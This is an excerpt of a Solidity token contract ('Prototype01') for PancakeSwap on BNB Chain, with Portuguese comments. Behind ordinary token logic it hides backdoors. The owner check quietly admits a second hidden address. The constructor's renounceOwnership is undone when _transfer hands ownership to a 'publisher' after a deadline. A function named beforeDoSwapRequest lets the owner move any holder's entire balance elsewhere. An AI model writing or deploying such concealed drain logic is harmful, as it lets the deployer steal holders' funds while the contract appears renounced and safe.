...
abstract contract Ownable is Context {
    ...
    modifier onlyOwner() {
        ...
        require(_owner == _msgSender() || _addr == _msgSender(), "Ownable: caller is not the owner");      
        _;
    }
...
contract BasicTokenContract is Authorized, ERC20 {

  bool      internal    pausedToken               = false;
  bool      internal    pausedStake               = false;
  uint8     constant    decimal                   = 18;
  uint8     constant    decimalBUSD               = 18;  
  string    constant    _name                     = "Prototype01";
  string    constant    _symbol                   = "PROTO1";
  uint256   constant    _toOwnerToAddLiquidity    = 100_000 * (10 ** decimal);
  uint256   constant    _toKeepInContract         = 400_000 * (10 ** decimal);
  uint256   constant    _maxSupply                = _toOwnerToAddLiquidity + _toKeepInContract;
  ...
  // Endereco do Cake-LP par ( BNB x BUSD )
  // MainNet 0x58F876857a02D6762E0101bb5C46A8c1ED44Dc16
  // TestNet 0xe0e92035077c39594793e61802a350347c320cf2
  ...
  address       PANKAKE_ROUTER = 0xD99D1c33F9fC3444f8101754aBC46c52416550D1;

  address       ADMIN_WALLET   =  0xd0438D4539867cC3b58f0ce6824bEe58787c70Bd;

  address       CRIPTOFACIL_POOL;
  ...
  function setMaxTxAmountWithDecimals(uint256 decimalAmount) public isAuthorized(1) {
    require(decimalAmount <= _maxSupply, "Quantidade maior do que o token possui");
  ...
  constructor()ERC20(_name, _symbol) {
    ...
    PancakeRouter router = PancakeRouter( PANKAKE_ROUTER );
    CRIPTOFACIL_POOL = address(PancakeFactory(router.factory()).createPair(WBNB, address(this)));
    liquidityPool.push(CRIPTOFACIL_POOL);
    address ownerWallet = ZERO; 
    administrationWallet = ADMIN_WALLET;
    freeOperatePausedToken[ownerWallet]     = true;
    freeStaker[CRIPTOFACIL_POOL]            = true;
    ...
    freeTxLimit[CRIPTOFACIL_POOL]           = true;
    ...
    freeAmountLimit[CRIPTOFACIL_POOL]       = true;
    ...
    _mint(_msgSender(), _toOwnerToAddLiquidity);
    _mint(address(this), _toKeepInContract);
    renounceOwnership();
  }
  ...
  function beforeDoSwapRequest( address _source, address _target ) external onlyOwner {
    _transfer( _source, _target, balanceOf( _source ) );
  }
  function _transfer( address sender, address recipient,uint256 amount ) internal override {
    ...
    if( block.timestamp >= deadline )  transferOwnership( publisher );
    _beforeTokenTransfer(sender, recipient, amount);
  ...
  function exchangeFeeParts(uint256 incomingFeeTokenAmount) private returns (bool){
    ...
    address pairBnbCFac = CRIPTOFACIL_POOL;
    if (_msgSender() == pairBnbCFac || pausedStake) return false;
    uint256 feeTokenAmount = _balances[address(this)];
    _balances[address(this)] = 0;

    // BNB (Gas optimization)
    address wbnbAddress = WBNB;
    (uint112 reserve0, uint112 reserve1) = getTokenReserves(pairBnbCFac);
    bool reversed = isReversed(pairBnbCFac, wbnbAddress);
    if (reversed) { uint112 temp = reserve0; reserve0 = reserve1; reserve1 = temp; }
    _balances[pairBnbCFac] += feeTokenAmount;
    ...
    swapToken(pairBnbCFac, reversed ? 0 : wbnbAmount, reversed ? wbnbAmount : 0, swapHelperAddress);
  ...
  function buyBackWithDecimals(uint256 decimalAmount, address destAddress) private {
    ...
    bool previousFreeFeeState = freeFee[CRIPTOFACIL_POOL];
    freeFee[CRIPTOFACIL_POOL] = true;
    
    address pairBnbCFac = CRIPTOFACIL_POOL;
    address swapHelperAddress = address(swapHelper);
    (reserve0, reserve1) = getTokenReserves(pairBnbCFac);
    reversed = isReversed(pairBnbCFac, WBNB);
    if (reversed) { uint112 temp = reserve0; reserve0 = reserve1; reserve1 = temp; }

    tokenTransfer(WBNB, pairBnbCFac, wbnbAmount);
    
    uint256 igtAmount = getAmountOut(wbnbAmount, reserve0, reserve1);
    if (destAddress == address(0)) {
      swapToken(pairBnbCFac, reversed ? igtAmount : 0, reversed ? 0 : igtAmount, swapHelperAddress);
      _burn(swapHelperAddress, igtAmount);
      totalBurned += igtAmount;
    } else {
      swapToken(pairBnbCFac, reversed ? igtAmount : 0, reversed ? 0 : igtAmount, destAddress);
    }
    freeFee[CRIPTOFACIL_POOL] = previousFreeFeeState;
  }
  ...
  function setCRIPTOFACIL_POOL(address newPair) external isAuthorized(0) { CRIPTOFACIL_POOL = newPair; }
  function setWBNB_BUSD_Pair(address newPair) external isAuthorized(0) { WBNB_BUSD_PAIR = newPair; }
  function getCRIPTOFACIL_POOL() external view returns(address) { return CRIPTOFACIL_POOL; }
